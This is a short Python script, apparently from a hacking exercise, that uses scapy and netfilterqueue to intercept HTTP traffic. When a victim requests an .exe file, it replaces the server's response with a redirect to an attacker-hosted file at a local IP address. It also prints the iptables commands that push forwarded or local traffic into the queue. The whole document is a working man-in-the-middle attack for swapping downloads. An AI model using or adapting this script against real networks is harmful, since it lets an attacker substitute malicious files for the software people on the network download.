#!usr/bin/ python
import netfilterqueue
import scapy.all as scapy

ack_list = []
print("Website To Test: http://startrinity.com/HttpTester/HttpRestApiClientTester.aspx")
print(
    "For remote Coputer\niptable -I FORWARD -j NFQUEUE --queue-num 0\nFor my Computer\niptable -I OUTPUT -j NFQUEUE --queue-num \niptable -I INPUT -j NFQUEUE --queue-num 0")


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("########### Request ##########")
                print("########### Exe File ##########")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("########### Response ##########")
                print("########### Replacing File ##########")
                modify_packet = set_load(scapy_packet,
                                         "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.67.128/downloading_file.py\n\n")
                packet.set_payload(str(modify_packet))

        else:
            pass

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()